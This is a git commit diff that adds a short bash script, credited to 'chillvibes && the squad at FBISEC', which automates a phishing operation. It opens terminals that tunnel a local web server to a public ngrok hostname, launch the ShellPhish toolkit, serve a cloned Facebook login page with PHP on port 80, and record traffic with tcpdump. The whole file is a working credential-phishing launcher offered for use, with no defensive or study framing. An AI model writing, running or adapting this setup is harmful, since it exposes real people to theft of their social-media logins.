a1598c0cf65aa5a095140401eb3aa575cc119c1e
ChillVibesMushroom <99580833+ChillVibesMushroom@users.noreply.github.com>
2023-01-03 07:27:46 -0700

    Add files via upload

---
+++ shellphish.sh
@@ -0,0 +1,9 @@
+#!/bin/bash
+#Credit goes to chillvibes && the squad at FBISEC  for the creation of this script
+xterm -title "ngrok" -e " sudo ngrok http 80 --hostname=bloggers.ngrok.io --region=us" &
+
+xterm -hold -title "shellphish" -e "cd ShellPhish && sudo bash shellphish.sh" &
+
+xterm -title "php" -e "cd /home/live/ShellPhish/sites/facebook && sudo php -S 0.0.0.0:80" &
+
+xterm -title "tcpdump" -e "sudo tcpdump -w shellphish.pcap"
